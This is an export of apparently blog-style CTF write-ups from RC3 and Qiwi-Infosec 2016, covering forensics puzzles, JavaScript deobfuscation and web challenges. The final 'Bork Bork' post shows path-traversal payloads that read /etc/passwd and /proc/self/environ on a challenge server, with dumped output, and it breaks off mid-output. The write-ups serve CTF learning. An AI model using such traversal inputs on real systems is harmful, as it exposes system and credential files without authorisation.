:tada:","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"RC3 CTF - 100 - My Lil Droid - Forensics","slug":"RC3CTF-2016-forensics-100-My-Lil-Droid","date":"2016-11-21T23:00:00.000Z","updated":"2017-02-07T18:23:36.642Z","comments":true,"path":"en/RC3CTF-2016-forensics-100-My-Lil-Droid/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-forensics-100-My-Lil-Droid/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description Sometimes not all files are needed. Hint: – You probably don’t have to run it Solution For this challenge, we have an apk file nammed youtube.apk. First, let decode it with apktool to see usefull file like AndroidManifest.xml : apktool d youtube.apk. We know that we are seeking a RC3-2016 flag, so go search in files we extracted : cd youtube find . -type f -exec grep RC3-2016 {} \\; =&gt; No result find . -type f -exec grep RC3 {} \\; give this output : new-instance v1, Ljava/util/zip/CRC32; invoke-direct {v1}, Ljava/util/zip/CRC32;-&gt;&lt;init&gt;()V invoke-virtual {v1, v4, v8, v0}, Ljava/util/zip/CRC32;-&gt;update([BII)V invoke-virtual {v1}, Ljava/util/zip/CRC32;-&gt;getValue()J Let's see if we can find 2016 string somewhere : find . -type f -exec grep 2016 {} \\; give a loot of string and the last one is a bit weird : UkMz-2016-R09URU0yMQ== Decode this in base64 : flag = RC3-2016-GOTEM21.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"RC3 CTF - 300 - Breaking News - Forensics","slug":"RC3CTF-2016-forensics-300-breaking-news","date":"2016-11-21T23:00:00.000Z","updated":"2017-02-07T18:23:36.635Z","comments":true,"path":"en/RC3CTF-2016-forensics-300-breaking-news/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-forensics-300-breaking-news/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description N.C. Solution For this challenge, we have a tar.gz file which is containing 20 zip files. These ones are storing txt files. There is a story is these txt files but we can't see any 2016 string so the flag isn't here... So, why don't examinate the content of zip files to see if we missed something... In a directory where the 20 zip files are stored, we typed : strings * 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475GINgChapter0.txtUTL+^=&lt;U&lt;i%[GINgChapter0.txtUTChapter10.txtUTChapter10.txtUTMTYtRFUKChapter11.txtUT;X c`s;(yCc_/_PKChapter11.txtUTChapter12.txtUTWow, these Queebloid folks do not fool around.Chapter12.txtUTChapter13.txtUTH,Q/V(,Q(NMChapter13.txtUTChapter14.txtUT0gZ+?6(UChapter14.txtUTChapter15.txtUTY*mO.Xt]3oc$M8eChapter15.txtUTS1lGCg==Chapter16.txtUT2VD%Chapter16.txtUTChapter17.txtUT6[inChapter17.txtUTChapter18.txtUT,QH,(HM,*V(Chapter18.txtUTQkxTCg==Chapter19.txtUT*Cut to black*Chapter19.txtUTChapter1.txtUTD&#123;N1!Rk\\^hE3nChapter1.txtUTGIKZo=fChapter2.txtUTGIKZo=fChapter2.txtUTChapter3.txtUTChapter3.txtUTChapter4.txtUTChapter4.txtUTUkMKChapter5.txtUT\\DjXpZzUNR!R9K4r&gt;&amp;Chapter5.txtUTChapter6.txtUTChapter6.txtUTChapter7.txtUTChapter7.txtUTChapter8.txtUTChapter8.txtUTChapter9.txtUTK)VH,JU(Chapter9.txtUTMy0yMAo= Some base64 encoded strings ?! Let decode MTYtRFUK + S1lGCg== + QkxTCg== + UkMK + My0yMAo=: MTYtRFUK : 16-DU S1lGCg== : KYF QkxTCg== : BLS UkMK : RC My0yMAo= : 3-20 So, if we put strings in order of chapter number, we obtain the flag RC3-2016-DUKYFBLS.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"RC3 CTF - 50 - Somepang - Forensics","slug":"RC3CTF-2016-forensics-50-somepang","date":"2016-11-21T23:00:00.000Z","updated":"2017-02-07T18:23:36.642Z","comments":true,"path":"en/RC3CTF-2016-forensics-50-somepang/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-forensics-50-somepang/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description Examine the file and find the flag. Solution First, open the pcap file with Wireshark. We can see 98906 ICMP frames with the same length. Look at the data, it's always the same character repeated in each request/reply. The last packet data character is &quot;=&quot; so we can imagine that stuff encoded in base64. Let capture all characters and decode it to a file : 12345678910111213141516171819# author : Chill3dimport base64import osfrom scapy.all import *pcap=rdpcap(\"./somepang.pcap\" )string=\"\"i=0for packet in pcap: i=i+1 if(i%2==0): string+=str(packet)[-2:]file_t=open(\"flag\",\"w\" )file_t.write(base64.b64decode(string))file_t.close()print stringprint base64.b64decode(string) This will create a file nammed flag. Let's see which type of file was produced : 12$ file flagflag: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 720x449, frames 3 Open it with a picture viewer : Flag : RC3-2016-PANG-ME-LIKE-ONE-OF-YOU-FRENCH-GORILLAZ","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Qiwi-Infosec CTF - 100 - javascript - Web","slug":"QiwiInfosecCTF-2016-web-100-javascript","date":"2016-11-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.615Z","comments":true,"path":"en/QiwiInfosecCTF-2016-web-100-javascript/","link":"","permalink":"https://rawsec.ml/en/QiwiInfosecCTF-2016-web-100-javascript/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Qiwi-Infosec CTF-2016 Website : https://qiwictf.ru/ Type : Online Format : Jeopardy CTF Time : link Description we don't want to make any interface. just solve it Solution We have a packed javascript code: 1eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&amp;lt;a?'':e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)&#123;d[e(c)]=k[c]||e(c)&#125;k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1&#125;;while(c--)&#123;if(k[c])&#123;p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])&#125;&#125;return p&#125;('18 10()&#123;1a(1b(\"%o%p%9%3%8%g%a%9%0%1%9%3%a%5%1%6%e%8%2%7%0%F%b%0%0%0%0%j%4%2%0%3%c%4%2%e%0%d%0%G%u%M%D%1c%1d%N%16%11%13%14%17%15%R%w%19%1p%1l%Q%1m%P%1n%U%12%X%V%Y%4%i%3%5%1%o%t%c%g%z%1o%m%1e%9%a%L%1k%2%e%8%p%j%A%1j%1f%E%q%l%s%v%O%1g%n%1h%I%Z%r%1i%d%G%f%b%0%0%0%0%j%4%2%0%1%9%3%a%5%1%5%0%d%0%C%B%f%b%0%0%0%0%j%4%2%0%3%0%d%0%q%f%b%0%0%0%0%A%c%g%m%1%0%6%3%0%k%0%e%8%2%h%m%1%9%t%8%c%7%0%F%b%0%0%0%0%0%0%0%0%j%4%2%0%i%q%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%l%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%s%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%p%o%0%d%0%6%i%q%0%k%k%0%l%n%7%0%r%0%6%6%i%l%0%J%J%0%q%7%0%k%k%0%I%7%0%r%0%6%i%s%0%J%J%0%q%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%q%0%d%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%l%I%7%7%0%y%y%0%l%I%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%l%0%d%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%l%s%7%7%0%y%y%0%l%s%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%s%0%d%0%g%e%w%4%w%6%i%l%7%0%T%0%n%O%0%S%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%n%7%7%0%y%y%0%n%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%v%0%d%0%g%e%w%4%w%6%i%s%7%0%T%0%n%O%0%S%0%6%i%p%o%0%K%0%n%v%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%q%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%l%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%s%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%v%7%f%b%0%0%0%0%H%b%0%0%0%0%2%1%8%p%2%9%0%1%9%3%a%5%1%5%h%z%a%g%9%6%G%G%7%f%b%0%H%b%g%o%0%6%1%9%3%a%5%1%6%3%8%o%h%L%4%e%e%A%a%2%5%h%j%4%m%p%1%7%0%d%d%0%x%4%z%Q%s%w%11%w%z%3%z%N%A%5%N%Z%o%X%E%M%g%Y%9%U%E%V%E%Q%q%R%P%M%p%x%7%F%4%m%1%2%8%6%x%P%c%4%8%0%2%g%t%c%8%W%x%7%f%H%1%m%e%1%F%4%m%1%2%8%6%x%12%2%a%9%t%0%L%4%e%e%A%a%2%5%W%x%7%f%H%0%b\"))&#125;10();',62,88,'20|65|72|63|61|64|28|29|74|6E|6F|0A|68|3D|73|3B|69|2E|62|76|3C|31|6C|36|66|75|30|2B|32|67|41|33|4E|22|3E|6A|77|5D|5B|43|7A|7B|27|7D|38|7C|26|70|42|46|34|54|52|4D|3A|3F|56|59|21|58|5A|39|check|48|57|49|4A|4C|47|4B|function|4F|eval|unescape|44|45|6D|79|35|37|2F|78|71|51|53|55|6B|50'.split('|'),0,&#123;&#125;)) I used a javascript desobfuscator: http://matthewfl.com/unPacker.html. That gave me the following partially unpacked code: 12345function check() &#123; eval(unescape(\"%66%75%6E%63%74%69%6F%6E%20%65%6E%63%6F%64%65%28%73%74%72%29%20%7B%0A%20%20%20%20%76%61%72%20%63%68%61%72%73%20%3D%20%27%41%42%43%44%45%46%47%48%49%4A%4B%4C%4D%4E%4F%50%51%52%53%54%55%56%57%58%59%5A%61%62%63%64%65%66%67%68%69%6A%6B%6C%6D%6E%6F%70%71%72%73%74%75%76%77%78%79%7A%30%31%32%33%34%35%36%37%38%39%2B%2F%3D%27%3B%0A%20%20%20%20%76%61%72%20%65%6E%63%6F%64%65%64%20%3D%20%5B%5D%3B%0A%20%20%20%20%76%61%72%20%63%20%3D%20%30%3B%0A%20%20%20%20%77%68%69%6C%65%20%28%63%20%3C%20%73%74%72%2E%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%30%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%31%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%32%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%75%66%20%3D%20%28%62%30%20%3C%3C%20%31%36%29%20%2B%20%28%28%62%31%20%7C%7C%20%30%29%20%3C%3C%20%38%29%20%2B%20%28%62%32%20%7C%7C%20%30%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%30%20%3D%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%31%38%29%29%20%3E%3E%20%31%38%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%31%20%3D%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%31%32%29%29%20%3E%3E%20%31%32%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%32%20%3D%20%69%73%4E%61%4E%28%62%31%29%20%3F%20%36%34%20%3A%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%36%29%29%20%3E%3E%20%36%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%33%20%3D%20%69%73%4E%61%4E%28%62%32%29%20%3F%20%36%34%20%3A%20%28%62%75%66%20%26%20%36%33%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%30%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%31%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%32%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%33%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20%72%65%74%75%72%6E%20%65%6E%63%6F%64%65%64%2E%6A%6F%69%6E%28%27%27%29%3B%0A%20%7D%0A%69%66%20%28%65%6E%63%6F%64%65%28%63%74%66%2E%70%61%73%73%77%6F%72%64%2E%76%61%6C%75%65%29%20%3D%3D%20%22%61%6A%52%32%4E%48%4E%6A%63%6A%46%77%64%46%39%66%58%7A%42%69%5A%6E%56%7A%59%7A%52%30%4D%54%42%75%22%29%7B%61%6C%65%72%74%28%22%54%68%61%74%20%72%69%67%68%74%21%22%29%3B%7D%65%6C%73%65%7B%61%6C%65%72%74%28%22%57%72%6F%6E%67%20%70%61%73%73%77%6F%72%64%21%22%29%3B%7D%20%0A\"))&#125;check(); SO I ran the uneascape() function and that gave me this clear code: 123456789101112131415161718192021function encode(str) &#123; var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; var encoded = []; var c = 0; while (c &lt; str.length) &#123; var b0 = str.charCodeAt(c++); var b1 = str.charCodeAt(c++); var b2 = str.charCodeAt(c++); var buf = (b0 &lt;&lt; 16) + ((b1 || 0) &lt;&lt; 8) + (b2 || 0); var i0 = (buf &amp; (63 &lt;&lt; 18)) &gt;&gt; 18; var i1 = (buf &amp; (63 &lt;&lt; 12)) &gt;&gt; 12; var i2 = isNaN(b1) ? 64 : (buf &amp; (63 &lt;&lt; 6)) &gt;&gt; 6; var i3 = isNaN(b2) ? 64 : (buf &amp; 63); encoded[encoded.length] = chars.charAt(i0); encoded[encoded.length] = chars.charAt(i1); encoded[encoded.length] = chars.charAt(i2); encoded[encoded.length] = chars.charAt(i3); &#125; return encoded.join(''); &#125;if (encode(ctf.password.value) == \"ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu\")&#123;alert(\"That right!\");&#125;else&#123;alert(\"Wrong password!\");&#125; We can see that once encoded the password need to match ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu. Take a look: var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; is the base64 alphabet. Try to decode ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu in base64 and we get j4v4scr1pt___0bfusc4t10n. Just to check, execute encode('j4v4scr1pt___0bfusc4t10n') and you get ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu. So this obfuscated function is just doing base64. Our flag is j4v4scr1pt___0bfusc4t10n.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"RC3 CTF - 100 - Who's a good boy - Web","slug":"RC3CTF-2016-web-100-Who-s-a-good-boy","date":"2016-11-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.635Z","comments":true,"path":"en/RC3CTF-2016-web-100-Who-s-a-good-boy/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-web-100-Who-s-a-good-boy/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description You’re trying to see the cute dog pictures on ctf.rc3.club. But every time you click on one of them, it brings you to a bad gateway. https://ctf.rc3.club:3000/ -- Your friendly neighborhood webadmin Solution We can see that one of the image is not like all others: 1234567891011[...]&lt;img class=\"phil me up\"src=\"http://admissions.vanderbilt.edu/insidedores/manage/wp-content/uploads/doge-pattern-27481-2880x1800.jpg\"&gt;&lt;h4&gt;the absolute mostest?&lt;/p&gt;&lt;img class=\"philarydufflebag\"src=\"http://admissions.vanderbilt.edu/insidedores/doge/this-aint-the-RC3-flag-we're-getting-there-though.jpg\"&gt;&lt;h4&gt;CTF flags!!1!&lt;/p&gt;&lt;img class=\"guys the flag is!\"src=\"http://admissions.vanderbilt.edu/insidedores/manage/wp-content/uploads/doge-pattern-27481-2880x1800.jpg\"&gt;&lt;h4&gt;Find the Phil&lt;/p&gt;[...] But this image doesn't exist, and is not cached in the WayBackMachine. Each image has a different class: 12345678910111213141516171819202122232425262728&lt;img class=\"why hello there\"&lt;img class=\"try not to get too distracted\"&lt;img class=\"or infuriated\"&lt;img class=\"don't give up, you can do it!\"&lt;img class=\"hey, by the way\"&lt;img class=\"have you ever\"&lt;img class=\"heard of phil\"&lt;img class=\"phil's a good name\"&lt;img class=\"philly phil phil\"&lt;img class=\"philthy phil\"&lt;img class=\"now if only there was a way to philter out this nonsense\"&lt;img class=\"phil likes phalgs?\"&lt;img class=\"phil's gone phishing\"&lt;img class =\"philet-o-phish\"&lt;img class= \"philament\"&lt;img class = \"philanthropy\"&lt;img class=\"phil me up\"&lt;img class=\"philarydufflebag\"&lt;img class=\"guys the flag is!\"&lt;img class=\"phil pills r phor phil's phlegm\"&lt;img class=\"not phil nor phlag\"&lt;img class=i like scary philms\"&lt;img class=phillllllyy\"&lt;img class= philadelphia\"&lt;img class=\"fill me up with dreams of phil\"&lt;img class=\"still not phil\"&lt;img class=\"also not phil\"&lt;img class=\"not phil\" See what is the mess in the css: 12345678[...].philarydufflebag&#123;/*hiya*//*compress your frontend*//*here's a flag :)*/flag:RC3-2016-CanineSS&#125; Flag was not well hidden: RC3-2016-CanineSS.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"RC3 CTF - 300 - Bork Bork - Web","slug":"RC3CTF-2016-web-300-bork-bork","date":"2016-11-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.645Z","comments":true,"path":"en/RC3CTF-2016-web-300-bork-bork/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-web-300-bork-bork/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description UPDATE: We have made changes to this challenge to make it (somewhat) stable. If what you were trying before is not working, it's because it was causing a problem for us on the back end. I assure you that what you were doing was not the easiest solution, anyway. We all love doggos and puppers. Have some more of one of our favorite puppers, Gabe. Bork. https://ctf.rc3.club:3100/ author:orkulus Solution TL;DR: Warning, this is an incomplete writeup, we didn't solve this challenge. We can see the server is not an apache or nginx: Server: Werkzeug/0.11.11 Python/2.7.12. The dropdown menu is used to select a file (something.txt). The server use cat to read it en write its content into the src attribute of a video balise. So we will try to disclose some system files into this src with the bork POST attribute. So let's see the behaviour with: bork=test.txt &lt;iframe width=&quot;854&quot; height=&quot;480&quot; src=&quot;cat: borks/test.txt: No such file or directory?autoplay=1&amp;loop=1&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt; bork=../../../../../etc/passwd 1234567891011121314151617181920212223242526272829303132&lt;iframe width=&quot;854&quot; height=&quot;480&quot; src=&quot;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsesshd:x:110:65534::/var/run/sshd:/usr/sbin/nologinpollinate:x:111:1::/var/cache/pollinate:/bin/falseubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bashctfuser:x:1001:1001::/home/ctfuser:?autoplay=1&amp;loop=1&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt; bork=../../../../../proc/self/environ 1/LESSOPEN=|%20/usr/bin/lesspipe%20%s%EF%BF%BDPYTHONIOENCODING=UTF-8%EF%BF%BDTMUX=/tmp/tmux-1000/default,2791,1%EF%BF%BDMAIL=/var/mail/ctfuser%EF%BF%BDSSH_CLIENT=192.168.0.104%2038572%2022%EF%BF%BDUSER=ctfuser%EF%BF%BDSHLVL=4%EF%BF%BDHOME=/home/ctfuser%EF%BF%BDSSH_TTY=/dev/pts/4%EF%BF%BDLOGNAME=ctfuser%EF%BF%BDEVENT_NOEPOLL=1%EF%BF%BD_=/usr/bin/python%EF%BF%BDXDG_SESSION_ID=9%EF%BF%BDTERM=screen-256color%EF%BF%BDPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games%EF%BF%BDXDG_RUNTIME_DIR=/run/user/1000%EF%BF%BDLANG=en_US.UTF-8%EF%BF%BDLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:%EF%BF%BDSHELL=/bin/bash%EF%BF%BDLESSCLOSE=/usr/bin/lesspipe%20%s%20%s%EF%BF%BDPWD=/home/ctfuser/Web-300/app%EF%BF%BDSSH_CONNECTION=192.168.0.104%2057282%20192.168.30.121%2022%EF%BF%BDTMUX_PANE=%4%EF%BF%BD urldecode 1/LESSOPEN=| /usr/bin/lesspipe %sï¿½PYTHONIOENCODING=UTF-8ï¿½TMUX=/tmp/tmux-1000/default,2791,1ï¿½MAIL=/var/mail/ctfuserï¿½SSH_CLIENT=192.168.0.104 38572 